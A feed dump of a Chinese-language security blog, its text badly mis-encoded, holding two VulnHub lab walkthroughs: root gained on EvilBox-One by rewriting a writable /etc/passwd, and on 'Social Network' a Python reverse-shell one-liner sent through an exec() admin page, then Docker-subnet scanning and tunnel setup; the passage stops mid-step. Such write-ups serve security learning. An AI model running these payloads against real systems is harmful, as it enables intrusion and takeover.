#å’¦â“<br>&#x2F;dev&#x2F;dvd<br>&#x2F;dev&#x2F;cdrom<br>&#x2F;dev&#x2F;fb0<br>&#x2F;dev&#x2F;dri&#x2F;by-path&#x2F;pci-0000:00:02.0-card<br>&#x2F;dev&#x2F;dri&#x2F;card0<br>&#x2F;dev&#x2F;sg1<br>&#x2F;dev&#x2F;snd&#x2F;seq<br>&#x2F;dev&#x2F;snd&#x2F;timer<br>&#x2F;dev&#x2F;net&#x2F;tun<br>&#x2F;dev&#x2F;fuse<br>&#x2F;dev&#x2F;log<br>&#x2F;dev&#x2F;mqueue<br>&#x2F;dev&#x2F;shm<br>&#x2F;dev&#x2F;disk&#x2F;by-id&#x2F;ata-VBOX_CD-ROM_VB2-01700376<br>&#x2F;dev&#x2F;disk&#x2F;by-path&#x2F;pci-0000:00:01.1-ata-2<br>&#x2F;dev&#x2F;block&#x2F;11:0<br>&#x2F;dev&#x2F;sr0<br>&#x2F;dev&#x2F;char&#x2F;29:0<br>&#x2F;dev&#x2F;char&#x2F;226:0<br>&#x2F;dev&#x2F;char&#x2F;21:1<br>&#x2F;dev&#x2F;char&#x2F;5:0<br>&#x2F;dev&#x2F;char&#x2F;5:2<br>&#x2F;dev&#x2F;char&#x2F;1:5<br>&#x2F;dev&#x2F;char&#x2F;1:9<br>&#x2F;dev&#x2F;char&#x2F;1:8<br>&#x2F;dev&#x2F;char&#x2F;1:3<br>&#x2F;dev&#x2F;char&#x2F;1:7<br>&#x2F;dev&#x2F;stderr<br>&#x2F;dev&#x2F;stdout<br>&#x2F;dev&#x2F;stdin<br>&#x2F;dev&#x2F;fd<br>&#x2F;dev&#x2F;pts&#x2F;0<br>&#x2F;dev&#x2F;ptmx<br>&#x2F;dev&#x2F;tty<br>&#x2F;dev&#x2F;urandom<br>&#x2F;dev&#x2F;random<br>&#x2F;dev&#x2F;full<br>&#x2F;dev&#x2F;zero<br>&#x2F;dev&#x2F;null<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;sendsigs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootmisc.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;single.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountdevsubfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountroot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rmnologin.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;motd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;reboot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootlogd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rcS.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;hostname.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;cryptdisks.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountnfs-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rc.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;stop-bootlogd-single.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountall.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountall-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;stop-bootlogd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;cryptdisks-early.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkroot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountnfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountkernfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;halt.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkroot-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootlogs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountnfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;hwclock.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;x11-common.service<br>&#x2F;var&#x2F;tmp<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions<br>&#x2F;var&#x2F;lock</p></blockquote><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209002251743.png" alt="image-20211209002251743"></p><p>å‘ç°&#x2F;etc&#x2F;passwdç«Ÿç„¶æ˜¯å¯å†™çš„</p><p>è¿™é‡Œé€šè¿‡æŸ¥çœ‹kaliæœ¬æœºçš„&#x2F;etc&#x2F;passwdæƒé™ å¯¹æ¯”ä¸€ä¸‹æ­¤å¤„çš„å¼‚å¸¸</p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209002654265.png" alt="image-20211209002654265"></p><p>è€Œç›®æ ‡é¶æœºä¸Šçš„ç”¨æˆ·mowreeå±…ç„¶å…·æœ‰&#x2F;etc&#x2F;passwdæ–‡ä»¶çš„å†™æƒé™ çªç ´çš„ä¸€çº¿æ›™å…‰ğŸŒ</p><p>linuxç³»ç»Ÿå†…çš„ç”¨æˆ·åå­˜æ”¾åœ¨&#x2F;etc&#x2F;passwdæ–‡ä»¶å†…ï¼Œå¯†ç å­˜æ”¾åœ¨&#x2F;etc&#x2F;shadowæ–‡ä»¶å†…ï¼Œä½†æ˜¯&#x2F;etc&#x2F;shadowæ–‡ä»¶æ²¡æœ‰æƒé™ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥çš„æ€è·¯æ˜¯å€ŸåŠ©å·²æœ‰çš„å¯¹&#x2F;etc&#x2F;passwdçš„å†™æƒé™ï¼Œèƒ½å¦ä¿®æ”¹rootå¯†ç ï¼Ÿ</p><p>ç»™rootè´¦å·ç”Ÿæˆå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1   #-1 md5åŠ å¯†ç®—æ³•ä»£å·      è®¾å®šå¯†ç 123456</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209004130358.png" alt="image-20211209004130358"></p><p>å¤åˆ¶å¯†æ–‡$1$oSFKywfc$hOVlE.SmqSlT5aAhNHQsS1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/passwd        #ä¿®æ”¹rootç”¨æˆ·çš„å¯†ç </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209005157113.png" alt="image-20211209005157113"></p><p>æ›´æ”¹æˆåŠŸå</p><p>åˆ‡æ¢è‡³rootç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209005326964.png" alt="image-20211209005326964"></p><p>ææƒæˆåŠŸï¼Œæ‹¿åˆ°ç¬¬äºŒä¸ªflag 36QtXfdJWvdC0VavlPIApUbDlqTsBM</p><p>ğŸ†flag1</p><blockquote><p>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p></blockquote><p>ğŸ†flag2</p><blockquote><p>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;é¶æœºï¼š&lt;a href=&quot;https://download.vulnhub.com/evilbox/EvilBox---One.ova&quot;&gt;https://download.vulnhub.com/evilbox/EvilBox---One.ova&lt;/a&gt;&lt;br&gt;  éš¾åº¦ï¼šä½â†’ä¸­&lt;br&gt;  ç›®æ ‡ï¼šå–å¾— root æƒé™ + 2 Flag&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-1-BoredHackerBlog:Social Network</title>
    <link href="http://example.com/2022/04/12/week1/"/>
    <id>http://example.com/2022/04/12/week1/</id>
    <published>2022-04-12T07:11:59.457Z</published>
    <updated>2022-04-12T07:11:59.458Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Name:</strong> BoredHackerBlog: Social Network</p><p><strong>Date release:</strong> 29 Mar 2020</p><p><strong>Author</strong>: <a href="https://www.vulnhub.com/author/boredhackerblog,683/">BoredHackerBlog</a></p><p><strong>Series</strong>: <a href="https://www.vulnhub.com/series/boredhackerblog,295/">BoredHackerBlog</a></p><p><strong>Downloadï¼š</strong><a href="https://www.notion.so/01-1369b9060f3143efa7d241a715127a8c">https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</a></p><p><strong>Description:</strong></p><p>Leave a message is a new anonymous social networking site where users can post messages for each other. Theyâ€™ve assigned you to test their set up. They do utilize docker containers. You can conduct attacks against those too. Try to see if you can get root on the host though.</p><p><strong>Difficulty:</strong> Med</p><p><strong>Tasks involved:</strong></p><ul><li>port scanning</li><li>webapp attacks</li><li>code injection</li><li>pivoting</li><li>exploitation</li><li>password cracking</li><li>brute forcing</li></ul><p><strong>Virtual Machine:</strong></p><ul><li>Format: Virtual Machine (Virtualbox OVA)</li><li>Operating System: Linux</li></ul><p><strong>Networking:</strong></p><ul><li>DHCP Service: Enabled</li><li>IP Address Automatically assign</li></ul><p>This works better with VirtualBox rather than VMware.</p></blockquote><span id="more"></span><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1-ä¸»æœºå‘ç°"><a href="#1-ä¸»æœºå‘ç°" class="headerlink" title="1.ä¸»æœºå‘ç°"></a>1.ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a  #æŸ¥çœ‹kaliæ”»å‡»æœºIP</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102335376.png" alt="image-20210918102335376"></p><p>Kaliæ”»å‡»æœºçš„IPåœ°å€ä¸º10.0.2.4</p><p>ç”±äºåœ¨å±€åŸŸç½‘å†…æ­å»ºçš„é¶åœºç¯å¢ƒï¼Œå³æ”»å‡»æœºä¸ç›®æ ‡æœºå¤„äºåŒä¸€ç½‘æ®µï¼Œæ‰€ä»¥åœ¨ä¸»æœºå‘ç°ç¯èŠ‚é¦–é€‰ä½¿ç”¨äºŒå±‚åœ°å€å‘ç°æ–¹å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l #æ‰«æå½“å‰å±€åŸŸç½‘å†…å­˜æ´»ä¸»æœº</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102447136.png" alt="image-20210918102447136"></p><p>æ‰«æåˆ°äº†4ä¸ªIPï¼Œå…¶ä¸­å‰ä¸‰ä¸ªéƒ½æ˜¯è™šæ‹Ÿæœºä¸­è‡ªæœ‰çš„IPï¼Œ</p><p>æ•…ç›®æ ‡é¶æœºçš„IPåœ°å€ä¸º10.0.2.5</p><h3 id="2-ç«¯å£æ‰«æ"><a href="#2-ç«¯å£æ‰«æ" class="headerlink" title="2.ç«¯å£æ‰«æ"></a>2.ç«¯å£æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.5            </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102616054.png" alt="image-20210918102616054"></p><p>ç»“æœæ˜¾ç¤ºç›®æ ‡é¶æœºä¸Šå¼€æ”¾äº†22,5000ç«¯å£</p><h3 id="3-ç«¯å£æœåŠ¡ä¿¡æ¯æ‰«æ"><a href="#3-ç«¯å£æœåŠ¡ä¿¡æ¯æ‰«æ" class="headerlink" title="3.ç«¯å£æœåŠ¡ä¿¡æ¯æ‰«æ"></a>3.ç«¯å£æœåŠ¡ä¿¡æ¯æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,5000 -sV 10.0.2.5</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102738150.png" alt="image-20210918102738150"></p><p>ç»“æœæ˜¾ç¤º</p><p>22ç«¯å£å¼€æ”¾çš„SSHæœåŠ¡ ç‰ˆæœ¬ä¸º6.6 æ“ä½œç³»ç»Ÿä¸ºUbuntu</p><p>5000ç«¯å£å¼€æ”¾çš„httpæœåŠ¡ è·å–åˆ°çš„ä¿¡æ¯ä¸º Werkzeug httpd 0.14.1 (Python 2.7.15) å³è¿™æ˜¯åŸºäºPython2.7å¼€å‘çš„Webåº•å±‚æ¡†æ¶ï¼Œç”±æ­¤å¯ä»¥æƒ³åˆ°ï¼Œå¦‚æœåœ¨åé¢çš„æ¸—é€è¿‡ç¨‹ä¸­è‹¥<strong>å­˜åœ¨ä»£ç æ‰§è¡Œçš„æ¼æ´</strong>çš„è¯å¯ä»¥åˆ©ç”¨<strong>Python2è„šæœ¬æ‰§è¡Œä»£ç </strong>æ¥<strong>åå¼¹shell</strong></p><h3 id="4-è®¿é—®http-10-0-2-5çš„5000ç«¯å£"><a href="#4-è®¿é—®http-10-0-2-5çš„5000ç«¯å£" class="headerlink" title="4.è®¿é—®http://10.0.2.5çš„5000ç«¯å£"></a>4.è®¿é—®<a href="http://10.0.2.5çš„5000ç«¯å£/">http://10.0.2.5çš„5000ç«¯å£</a></h3><p>æ—¢ç„¶æ˜¯5000ç«¯å£å¼€æ”¾çš„WebæœåŠ¡ï¼Œåˆ™å¯ä½¿ç”¨æµè§ˆå™¨è®¿é—®æŸ¥çœ‹æ˜¯å¦æœ‰<strong>é»˜è®¤é¡µé¢</strong>æˆ–<strong>ç›®å½•åˆ‡å…¥ç‚¹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®ï¼šhttp://10.0.2.5:5000  </span><br></pre></td></tr></table></figure><p>é¡µé¢å¦‚å›¾</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102858614.png" alt="image-20210918102858614"></p><h3 id="5-ç®€å•çš„æ¼æ´æµ‹è¯•"><a href="#5-ç®€å•çš„æ¼æ´æµ‹è¯•" class="headerlink" title="5.ç®€å•çš„æ¼æ´æµ‹è¯•"></a>5.ç®€å•çš„æ¼æ´æµ‹è¯•</h3><p>å°è¯•å¯¹è¡¨å•æäº¤<strong>æµ‹è¯•é¡µé¢</strong>æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥ã€XSSç­‰ï¼Œæ²¡æœ‰ç›´æ¥ç›¸å…³æ¼æ´çš„åé¦ˆ</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918103046066.png" alt="image-20210918103046066"></p><h3 id="6-ç›®å½•æ‰«æ"><a href="#6-ç›®å½•æ‰«æ" class="headerlink" title="6.ç›®å½•æ‰«æ"></a>6.ç›®å½•æ‰«æ</h3><p>å¯¹<strong>ç›®å½•è·¯å¾„</strong>è¿›è¡Œå‘ç°ï¼ˆ<strong>éšè—è·¯å¾„&#x2F;é¡µé¢</strong>ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.5:5000</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918103746798.png" alt="image-20210918103746798"></p><p>ç»“æœæ˜¾ç¤ºå¾—åˆ°**&#x2F;admin**è·¯å¾„</p><h3 id="7-å‘ç°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´é¡µé¢"><a href="#7-å‘ç°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´é¡µé¢" class="headerlink" title="7.å‘ç°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´é¡µé¢"></a>7.å‘ç°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´é¡µé¢</h3><p>æµè§ˆå™¨è®¿é—®ï¼š<a href="http://10.0.2.5:5000/admin">http://10.0.2.5:5000/admin</a>     é¡µé¢å¦‚å›¾</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918103832110.png" alt="image-20210918103832110"></p><p>è¯¥é¡µé¢æç¤º<strong>â€œCode testing pageâ€ â€œNothing was ran. Input some code to exec()â€</strong></p><p>å¯è”æƒ³åˆ°æ˜¯å¦å¯ä»¥åˆ©ç”¨<strong>Python</strong>è¯­è¨€è¿è¡Œç¯å¢ƒçš„<strong>ä»£ç æ‰§è¡Œ</strong>è§¦å‘<strong>åå¼¹shell</strong></p><h4 id="7-1ç›‘å¬4444ç«¯å£"><a href="#7-1ç›‘å¬4444ç«¯å£" class="headerlink" title="7.1ç›‘å¬4444ç«¯å£"></a>7.1ç›‘å¬4444ç«¯å£</h4><p>åœ¨æ”»å‡»æœºKaliä¸Š<strong>ç›‘å¬ç«¯å£</strong>4444</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143219519.png" alt="image-20211009143219519"></p><h4 id="7-2æ‰§è¡ŒPythonè„šæœ¬"><a href="#7-2æ‰§è¡ŒPythonè„šæœ¬" class="headerlink" title="7.2æ‰§è¡ŒPythonè„šæœ¬"></a>7.2æ‰§è¡ŒPythonè„šæœ¬</h4><p>åœ¨æµè§ˆå™¨ç«¯çš„é¡µé¢å†…æ‰§è¡ŒPythonè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104035254.png" alt="image-20210918104035254"></p><h4 id="7-3åå¼¹shellæˆåŠŸè¿æ¥"><a href="#7-3åå¼¹shellæˆåŠŸè¿æ¥" class="headerlink" title="7.3åå¼¹shellæˆåŠŸè¿æ¥"></a>7.3åå¼¹shellæˆåŠŸè¿æ¥</h4><p>æ‰“å¼€kaliç›‘å¬ç«¯ï¼Œå¯çœ‹åˆ°å·²ç»<strong>æˆåŠŸè¿æ¥</strong>ï¼Œå¹¶æ‰§è¡Œ<strong>ls</strong>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹<strong>æ–‡ä»¶ä¿¡æ¯</strong>ï¼Œ<strong>id</strong>æŸ¥çœ‹å½“å‰<strong>ç”¨æˆ·æƒé™</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104101495.png" alt="image-20210918104101495"></p><h4 id="7-4ç¡®è®¤æƒé™ç¯å¢ƒ"><a href="#7-4ç¡®è®¤æƒé™ç¯å¢ƒ" class="headerlink" title="7.4ç¡®è®¤æƒé™ç¯å¢ƒ"></a>7.4ç¡®è®¤æƒé™ç¯å¢ƒ</h4><p>å‘ç°äº†å·²ç»æ‹¿åˆ°äº†<strong>rootç”¨æˆ·æƒé™</strong>ï¼Œä½†æ˜¯åˆçœ‹åˆ°ç›®å½•ä¸‹å­˜åœ¨æ–‡ä»¶Dockerfileï¼ˆæ˜¯Dockeræ ‡å‡†åŒ–éƒ¨ç½²çš„æ¨¡æ¿æ–‡ä»¶ï¼‰ï¼Œä¸ç”±å¾—<strong>æ€€ç–‘å½“å‰å–å¾—rootæƒé™çš„ç³»ç»Ÿæ˜¯ä¸€ä¸ªDockerå®¹å™¨çš„ç³»ç»Ÿ</strong>ï¼Ÿä¸å¦‚æŸ¥çœ‹ä¸€ä¸‹è¯¥æ–‡ä»¶</p><p>ï¼ˆç–‘ç‚¹éªŒè¯1ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat Dockerfile</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104242974.png" alt="image-20210918104242974"></p><p>çœ‹åˆ°æ–‡ä»¶å†…å®¹<strong>åŠ æ·±äº†æ€€ç–‘</strong>ï¼Œå½“å‰ç³»ç»Ÿæ˜¯å¦è¿è¡Œåœ¨ä¸€ä¸ªdockerç¯å¢ƒå†…</p><p>é‡‡ç”¨ä¸¤ç§æ–¹å¼<strong>åˆ¤æ–­</strong>æ˜¯å¦å·¥ä½œåœ¨dockerç¯å¢ƒï¼š</p><p>åˆ¤æ–­æ ¹ç›®å½•ä¸‹.dockerenv æ–‡ä»¶</p><p>ï¼ˆç–‘ç‚¹éªŒè¯2ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /.dockerenv</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104335706.png" alt="image-20210918104335706"></p><p>ç»“æœæ˜¾ç¤ºå­˜åœ¨æ ¹ç›®å½•ä¸‹çš„.dockerenv æ–‡ä»¶</p><p>æŸ¥è¯¢ç³»ç»Ÿè¿›ç¨‹çš„cgroupä¿¡æ¯</p><p>ï¼ˆç–‘ç‚¹éªŒè¯3ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104409653.png" alt="image-20210918104409653"></p><p>ç»“åˆä¸Šé¢çš„ä¸‰æ¬¡éªŒè¯ç»“æœï¼Œå¯ä»¥å®Œå…¨<strong>ç¡®è®¤æ­¤ç³»ç»Ÿå·¥ä½œåœ¨Dockerç¯å¢ƒå†…</strong>ã€‚</p><p>åœ¨æ­¤å¤„æ€è€ƒï¼šå¯ä»¥<strong>æŠŠDockerå®¹å™¨ç¯å¢ƒæ‰€å¤„çš„ç½‘æ®µçœ‹ä½œä¸€ä¸ªå†…ç½‘ç¯å¢ƒï¼Œé‚£ä¹ˆè¿™ä¸ªå†…ç½‘ç¯å¢ƒå†…æ˜¯å¦å­˜åœ¨å…¶ä»–å­˜æ´»ä¸»æœºå‘¢ï¼Ÿ</strong></p><p><strong>è‹¥å­˜åœ¨å…¶ä»–ä¸»æœº</strong>ï¼Œå°±æœ‰å¯èƒ½å¯ä»¥å¾—åˆ°<strong>æ›´å¤šçš„ä¿¡æ¯</strong>ï¼Œä»ä¿¡æ¯å†…æˆ–è®¸å¯ä»¥<strong>å‘ç°æ¼æ´</strong>ï¼Œè¿›è¡Œ<strong>åˆ©ç”¨</strong>ï¼Œå°è¯•<strong>ææƒ</strong>ç­‰ã€‚</p><h2 id="äºŒã€å†…ç½‘æ¸—é€"><a href="#äºŒã€å†…ç½‘æ¸—é€" class="headerlink" title="äºŒã€å†…ç½‘æ¸—é€"></a>äºŒã€å†…ç½‘æ¸—é€</h2><h3 id="1-ä¸»æœºå‘ç°-1"><a href="#1-ä¸»æœºå‘ç°-1" class="headerlink" title="1.ä¸»æœºå‘ç°"></a>1.ä¸»æœºå‘ç°</h3><p>å¯¹å†…ç½‘ç½‘æ®µå­˜æ´»ä¸»æœºè¿›è¡Œæ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(seq 1 5);do ping -c 1 172.17.0.$i;done</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨forå¾ªç¯å®šä¹‰ä¸€ä¸ªå˜é‡iï¼Œseqç”Ÿæˆä¸€ä¸ªåºåˆ—ï¼Œå¯¹ç½‘æ®µå†…æ¯ä¸€ä¸ªIPå‘1ä¸ªpingåŒ…ï¼Œ<strong>è‹¥å­˜æ´»åˆ™ä¼šè¿”å›åŒ…</strong>ã€‚</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104947534.png" alt="image-20210918104947534"></p><p>ç»“æœæ˜¾ç¤ºå…±æœ‰ä¸‰ä¸ªå›åŒ…â€”â€”<strong>ä¸‰ä¸ªå­˜æ´»ä¸»æœº172.17.0.1 ,172.17.0.2 ,172.17.0.3</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918105041952.png" alt="image-20210918105041952"></p><p>æŸ¥çœ‹å½“å‰IPä¸º172.17.0.3ï¼Œ<strong>æ•…è¯¥ç½‘æ®µå­˜æ´»ä¸»æœºä¸º172.17.0.1 172.17.0.2</strong></p><p>æ€è€ƒï¼šè·å–åˆ°ä¸¤ä¸ªå­˜æ´»ä¸»æœºåœ°å€ï¼Œè‡ªç„¶è€Œç„¶å°±è¦æ‰«æä¸¤å°ä¸»æœºä¸Šå¼€æ”¾çš„ç«¯å£å’ŒæœåŠ¡ç­‰ä¿¡æ¯ï¼Œä½†ç”±äºè¯¥IPå±äºå†…ç½‘ç½‘æ®µï¼ŒKaliæ”»å‡»<strong>é“è·¯ä¸é€š</strong>ï¼Œæ‰€ä»¥ç°åœ¨çš„å½“åŠ¡ä¹‹æ€¥å°±æ˜¯å°†<strong>å†…ç½‘ç©¿é€</strong>ï¼Œå³<strong>Kaliä¸172.17.0.1 172.17.0.2äº’é€š</strong>ã€‚</p><h3 id="2-å†…ç½‘éš§é“å»ºç«‹"><a href="#2-å†…ç½‘éš§é“å»ºç«‹" class="headerlink" title="2.å†…ç½‘éš§é“å»ºç«‹"></a>2.å†…ç½‘éš§é“å»ºç«‹</h3><h4 id="2-1ç¡®è®¤å†…æ ¸ä¿¡æ¯"><a href="#2-1ç¡®è®¤å†…æ ¸ä¿¡æ¯" class="headerlink" title="2.1ç¡®è®¤å†…æ ¸ä¿¡æ¯"></a>2.1ç¡®è®¤å†…æ ¸ä¿¡æ¯</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918105132374.png" alt="image-20210918105132374"></p><p>è·å–åˆ°è¯¥ç³»ç»Ÿå†…æ ¸ä¿¡æ¯ä¸ºï¼š<strong>Linux</strong> 2f55c536515d 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_<strong>64</strong> <strong>Linux</strong></p><h4 id="2-2å·¥å…·é€‰æ‹©ï¼ˆVenomï¼‰"><a href="#2-2å·¥å…·é€‰æ‹©ï¼ˆVenomï¼‰" class="headerlink" title="2.2å·¥å…·é€‰æ‹©ï¼ˆVenomï¼‰"></a>2.2å·¥å…·é€‰æ‹©ï¼ˆVenomï¼‰</h4><p>ä½¿ç”¨å·¥å…·Venom</p><p>å°†Venomçš„å¯¹åº”ç›®æ ‡ç³»ç»Ÿçš„<strong>å®¢æˆ·ç«¯ç¨‹åº</strong>æ‹·è´åˆ°ç›®æ ‡ç³»ç»Ÿä¸Šï¼ˆagentï¼‰</p><p>å†é€šè¿‡æ”»å‡»æœºkaliä¸Šçš„<strong>æœåŠ¡å™¨ç«¯ç¨‹åº</strong>(admin)</p><p>åœ¨äºŒè€…ä¹‹é—´<strong>å»ºç«‹ä¸€æ¡éš§é“</strong></p><p>æ•…Venomå®¢æˆ·ç«¯ç¨‹åºé€‰æ‹©ä¸ºï¼š<strong>admin_linux_x64ï¼Œagent_linux_x64</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918105515907.png" alt="image-20210918105515907"></p><h4 id="2-3ä¸Šä¼ å·¥å…·"><a href="#2-3ä¸Šä¼ å·¥å…·" class="headerlink" title="2.3ä¸Šä¼ å·¥å…·"></a>2.3ä¸Šä¼ å·¥å…·</h4><p>æ”»å‡»æœºKaliå†…Venom 